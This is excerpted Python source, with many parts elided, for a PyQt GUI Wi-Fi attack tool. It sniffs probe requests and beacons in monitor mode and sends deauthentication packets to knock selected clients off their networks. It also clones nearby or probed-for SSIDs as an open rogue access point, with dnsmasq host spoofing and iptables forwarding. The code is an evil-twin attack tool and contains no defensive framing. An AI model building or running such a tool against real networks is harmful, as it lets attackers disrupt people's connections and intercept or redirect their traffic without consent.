...
class Ui_MainWindow(QMainWindow):
    ...
    def __init__(self):
        ...
        self.Probe = namedtuple("Probe", "Time Source ProbeSSID Signal_dBm")

        # # start refresher daemon
        # refresher = Thread(target=self.refresher)
        # refresher.daemon = True
        # refresher.start()

        # ensure that the wireless network adapters are not blocked
        subprocess.Popen(['sudo', 'rfkill', "unblock", "wifi"], stdin=PIPE, stdout=PIPE,
                        stderr=PIPE)
    ...
    def setup_ui(self, MainWindow):
        ...
        self.pushButton.clicked.connect(self.mimic_probereq)
        ...
        self.pushButton_3.clicked.connect(self.mimic_vicinity)
        ...
        self.refresh_action.triggered.connect(self.refresh_tables)

        self.menuOptions.addAction(self.mon_action)
        self.menuOptions.addAction(self.refresh_action)
    ...
    def start_sniffing(self):
        """put selected adapter in monitoring mode and start sniffing for probe requests and beacon frames"""
        self.mon_adapter = self.mon_box.currentText()

        if not self.is_in_monitor_mode(self.mon_adapter):
            self.enable_monitoring_mon()
    ...
    def stop_sniffing(self):
        """stop sniffing and return adapter to station mode"""
        self.disable_monitoring_mon()
        self.is_sniffing = False
    ...
    def enable_monitoring_mon(self):
        """enable monitoring mode of the network card that is defined by 'adapter'"""
        print(self.mon_adapter)
        return_value = subprocess.check_output(['sudo', 'airmon-ng', 'start', self.mon_adapter])
        ...
        for line in lines:
            if len(line) > 0:
                words = line.split()
                # the first line that this word shows up in contains the new adapter name
                if len(words) > 1 and words[0] == "(mac80211":
                    if words[-1][-1:] == ')':  # compensating for a formatting error in airmon-ng
                        self.mon_adapter = words[-1][6:-1]
                    else:
                        self.mon_adapter = words[-1][6:]

                    print("new adapter is {}".format(self.mon_adapter))
                    return

    def disable_monitoring_mon(self):
        """disable monitoring mode of the network card that is defined by 'adapter'"""
        process = subprocess.Popen(['sudo', 'airmon-ng', 'stop', self.mon_adapter], stdin=PIPE, stdout=PIPE,
                                   stderr=PIPE)

    def enable_monitoring_ap(self):
        """enable monitoring mode of the network card that is defined by 'adapter'"""
        print(self.ap_adapter)
        return_value = subprocess.check_output(['sudo', 'airmon-ng', 'start', self.ap_adapter])
        ...
        for line in lines:
            if len(line) > 0:
                ...
                if len(words) > 1 and words[0] == "(mac80211":
                    if words[-1][-1:] == ')':  # compensating for a formatting error in airmon-ng
                        self.ap_adapter = words[-1][6:-1]
                    else:
                        self.ap_adapter = words[-1][6:]

                    print("new adapter is {}".format(self.ap_adapter))
                    return

    def disable_monitoring_ap(self):
        """disable monitoring mode of the network card that is defined by 'adapter'"""
        process = subprocess.Popen(['sudo', 'airmon-ng', 'stop', self.ap_adapter], stdin=PIPE, stdout=PIPE,
                                   stderr=PIPE)
    ...
    def insert_mon_adapters(self):
        """insert the available wireless internet adapters into the monitoring combobox"""
        for adapter in self.get_ip_adapters():
            self.mon_box.addItem(adapter)

    def insert_ap_adapters(self):
        """insert the available wireless internet adapters into the AP combobox"""
        for adapter in self.get_ip_adapters():
    ...
    def start_ap(self):
        ...
        with open("hostapd.conf", "w") as file:
            file.write("interface={}\n"
                       ...
                       "auth_algs=1\n"
                       "wpa=0".format(self.ap_adapter, self.ssid))
        ...
        with open("dnsmasq.conf", "w") as file:
            file.write("interface={}\n"
                       ...
                       "port=10467\n"
                       "addn-hosts=spoof.hosts".format(self.ap_adapter))
        
        # setup access point
        process = subprocess.Popen(['sudo', 'ifconfig', self.ap_adapter, "up", "192.168.0.1", "netmask",
        ...
        process = subprocess.Popen(['sudo', 'iptables', '--append', "FORWARD", "--in-interface",
                                    self.ap_adapter, "-j", "ACCEPT"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
        ...
        self.ap_label.setText("--Access Point ACTIVE: {}--".format(self.ssid))

        self.retranslateUi(MainWindow)

    def run_deauth(self):
        """run deauthentication attack on selected client"""
        ...
        for i in range(50):
            sendp(pkt, iface=self.mon_adapter)

    def sniff_helper(self):
        adapter = self.mon_adapter
    ...
    def pkt_received(self, pkt):
        ...
        if pkt.getlayer(Dot11).type == 0 and pkt.getlayer(Dot11).subtype == 4:
            ...
            self.probes[time] = self.Probe(time, src_mac, probe_ssid, signal)
        ...
        # frame with type 0 (management frame) and subtype 8 (beacon frame)
            ...
            if bssid in self.sel_clients:
                self.networks[bssid] = (self.Network(bssid, ssid, signal, channel, crypto, self.sel_clients[bssid]))
            else:
                self.networks[bssid] = (self.Network(bssid, ssid, signal, channel, crypto, set()))
        ...
        # have an ongoing connection
            ...
            dest = str(pkt.getlayer(Dot11).addr1)
            ...
            if src in self.networks:
                ...
                # ignore broadcast channel and multicast (both ipv4 and ipv6)
                if dest != "ff:ff:ff:ff:ff:ff" and not dest.startswith("01") and not dest.startswith("33:33"):
            ...
            if dest in self.networks:
                ...
                # ignore broadcast channel and multicast (both ipv4 and ipv6)
                if src != "ff:ff:ff:ff:ff:ff" and not src.startswith("01") and not src.startswith("33:33"):
                    self.sel_clients[dest].add(src)

    def refresher(self):
        """auto-refresh daemon, not working properly yet"""
        keyboard = Controller()

        while True:
            # if self.mimic_table.hasFocus() or self.probe_table.hasFocus():
    ...
    def refresh_tables(self):
        ...
        if self.has_ap:
            self.refresh_mimic_client_table()

    def refresh_mimic_table(self):
        """refreshes the mimic table"""
    ...
    def refresh_mimic_client_table(self):
        '''refreshes the mimic client table'''
        self.mimic_client_table.clear()

        # we get the return value for the shell command 'iwconfig' in byte-form
        return_value = subprocess.check_output(['cat', '/var/lib/misc/dnsmasq.leases'])

        # decode return_value to a string and split it per line
        lines = return_value.decode('UTF-8').split('\n')

        self.mimic_client_table.setColumnCount(3)
        self.mimic_client_table.setRowCount(len(lines)-1)

        col_headers = ["MAC", "Local IP", "Name"]

        for m, line in enumerate(lines):
            print(line)
            for n, word in enumerate(line.split()[1:4]):
                print(word)
                new_item = QTableWidgetItem(str(word))
                self.mimic_client_table.setItem(m, n, new_item)

        self.mimic_client_table.setHorizontalHeaderLabels(col_headers)

        self.mimic_client_table.resizeColumnsToContents()
        self.mimic_client_table.resizeRowsToContents()

    def refresh_probe_table(self):
        """refreshes the probe request table"""
        self.probe_table.clear()

        self.probe_table.setColumnCount(4)
        self.probe_table.setRowCount(len(self.probes))

        col_headers = ["Time", "Source", "Probing for", "Signal (dBm)"]
    ...
    def refresh_probe_ssid_table(self):
        """refreshes the probe ssid set table"""
    ...
    def update_client_table(self):
        """updates the client table based on selected AP"""
    ...
    def mimic_vicinity(self):
        """function for mimicking selected AP from mimic table"""
        # get BSSID from selected row
        row = self.mimic_table.currentIndex().row()
        self.ssid = self.mimic_table.item(row, 1).text()

        self.start_ap()

    def mimic_probereq(self):
        """function for miicking selected probe ssid from probe ssid table"""
        # get BSSID from selected row
        row = self.probe_ssid_table.currentIndex().row()
        self.ssid = self.probe_ssid_table.item(row, 0).text()
